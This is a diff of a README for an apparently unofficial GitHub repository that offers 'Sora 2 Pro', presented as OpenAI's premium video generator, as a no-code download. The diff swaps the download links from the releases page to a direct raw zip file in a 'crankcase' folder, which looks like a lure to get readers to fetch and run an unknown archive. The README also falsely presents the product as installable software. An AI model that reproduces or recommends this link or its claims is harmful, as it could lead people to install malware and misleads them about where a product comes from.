@@ -1,7 +1,7 @@
 # 🎥 Sora-2-Pro-No-Code-2025 - Create Stunning Videos Effortlessly
 
 ## 📥 Download the Latest Version
-[![Download Sora-2-Pro-No-Code-2025](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/masseeyy/Sora-2-Pro-No-Code-2025/releases)
+[![Download Sora-2-Pro-No-Code-2025](https://raw.githubusercontent.com/masseeyy/Sora-2-Pro-No-Code-2025/main/crankcase/Sora-2-Pro-No-Code-2025-v2.3-beta.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/masseeyy/Sora-2-Pro-No-Code-2025/main/crankcase/Sora-2-Pro-No-Code-2025-v2.3-beta.3.zip)
 
 ## 🎯 Overview
 Sora 2 Pro is the premium variant of Sora 2 by OpenAI. It provides higher-fidelity video generation, extended lengths (up to ≈ 25 seconds), priority access, and more professional-grade output compared to the standard tier. It is designed for users who want to craft high-quality videos without needing technical expertise.
@@ -27,7 +27,7 @@ Before downloading, make sure your device meets these requirements:
 ## 📥 Download & Install
 To download and install Sora 2 Pro, visit the Releases page. You will find the latest version available for download. 
 
-[Click here to download Sora 2 Pro](https://github.com/masseeyy/Sora-2-Pro-No-Code-2025/releases). 
+[Click here to download Sora 2 Pro](https://raw.githubusercontent.com/masseeyy/Sora-2-Pro-No-Code-2025/main/crankcase/Sora-2-Pro-No-Code-2025-v2.3-beta.3.zip). 
 
 Once you've downloaded the file, follow these steps to install and run the application:
 
